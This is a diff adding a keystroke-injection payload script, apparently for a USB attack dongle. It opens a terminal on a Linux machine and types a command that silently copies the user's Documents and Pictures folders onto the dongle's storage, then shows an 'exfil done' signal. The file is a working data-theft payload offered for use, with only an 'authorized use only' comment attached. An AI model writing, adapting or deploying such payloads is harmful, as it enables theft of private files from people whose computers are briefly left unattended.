@@ -1,0 +1,19 @@
+REM ============================================================
+REM Linux: exfil Documents + Pictures to the dongle
+REM REQUIRES: USB_STORAGE enabled (issued below). The card mounts
+REM at /media/$USER/DISK (Debian/Ubuntu) or /run/media/$USER/DISK
+REM (Fedora/Arch); both are tried. Copied into <mount>/exfil.
+REM AUTHORIZED USE ONLY.
+REM ============================================================
+USB_STORAGE enable
+DELAY 3000
+CTRL ALT T
+DELAY 1200
+STRINGLN mkdir -p /media/$USER/DISK/exfil /run/media/$USER/DISK/exfil; cp -R ~/Documents /media/$USER/DISK/exfil/ 2>/dev/null; cp -R ~/Documents /run/media/$USER/DISK/exfil/ 2>/dev/null; cp -R ~/Pictures /media/$USER/DISK/exfil/ 2>/dev/null; cp -R ~/Pictures /run/media/$USER/DISK/exfil/ 2>/dev/null
+DELAY 2500
+STRINGLN exit
+DELAY 400
+LED_BLINK 5 #FFD600
+SCREEN_TEXT exfil done #FFD600
+LOG linux_exfil_documents: copy issued
+REM USB_STORAGE disable
